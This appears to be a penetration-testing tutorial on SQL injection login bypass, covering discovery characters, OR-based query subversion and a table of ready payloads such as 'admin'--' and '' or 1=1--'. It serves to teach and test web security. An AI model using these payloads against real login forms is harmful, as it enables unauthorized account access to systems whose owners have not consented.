# SQL Injection: Subverting Query Logic

## Introduction
SQL injection allows attackers to modify the original query by injecting operators and using SQL comments to subvert the query's logic. A common example is bypassing web authentication.

---

## Authentication Bypass Basics

### Original Query
```sql
SELECT * FROM logins WHERE username='admin' AND password='p@ssw0rd';
```

### Goal
Log in as admin without knowing the password by making the query always return TRUE.

---

## SQLi Discovery Payloads

| Payload | URL Encoded | Purpose |
|---------|-------------|---------|
| `'` | `%27` | Test for syntax errors (odd number of quotes) |
| `"` | `%22` | Test for syntax errors |
| `#` | `%23` | Comment out remaining query |
| `;` | `%3B` | Terminate statement and execute new one |
| `)` | `%29` | Close parenthesis |

**Note:** Use URL-encoded versions for GET requests.

### Testing with Single Quote
```
Username: ' 
Password: something
```

**Result:** SQL syntax error occurs because the query becomes:
```sql
SELECT * FROM logins WHERE username=''' AND password='something';
```

---

## OR Injection Technique

### Important Concept
- **AND** operator is evaluated **before OR** (precedence)
- If at least one OR condition is TRUE, the entire query returns TRUE

### Common Payload
```sql
admin' or '1'='1
```

### How It Works
The injected query becomes:
```sql
SELECT * FROM logins WHERE username='admin' or '1'='1' AND password='something';
```

**Logic Flow:**
1. `'1'='1'` → TRUE
2. `password='something'` → FALSE
3. AND condition: TRUE AND FALSE → FALSE
4. `username='admin'` → TRUE
5. OR condition: TRUE OR FALSE → TRUE ✅

### Successful Bypass
```
Username: admin' or '1'='1
Password: anything
```

---

## Bypassing Without Known Username

### Password Field Injection
Try injecting OR condition in the password field:
```
Username: notAdmin
Password: something' or '1'='1
```

### Final Query
```sql
SELECT * FROM logins WHERE username='notAdmin' OR '1'='1' AND password='something' OR '1'='1';
```

### Ultimate Simple Bypass
```
Username: ' or '1'='1
Password: ' or '1'='1
```

**Result:** Returns first user in the table (often admin)

---

## Key Takeaways

1. **Always test with a single quote** to detect vulnerabilities
2. **Use `OR` operators** to make conditions always TRUE
3. **Pay attention to operator precedence** (AND before OR)
4. **The `'1'='1'` condition** always returns TRUE
5. **Comment out** the rest of the query when needed with `#` or `--`
6. **Multiple bypass payloads exist** - test variations

---

## Additional Useful Payloads

| Payload | Explanation |
|---------|-------------|
| `' or 1=1--` | Basic bypass with comment |
| `admin'--` | Comment out password check |
| `admin'#` | Alternative comment syntax |
| `admin') or ('1'='1` | Close parenthesis first |
| `' or '1'='1' or '1'='1` | Multiple OR conditions |
| `admin' or 1=1#` | Numeric true condition |

---

## Important Notes

- **Always use URL encoding** for GET requests
- **Test variations** of payloads for different SQL dialects
- **Different databases** may require different syntax
- **Always test on authorized systems only**
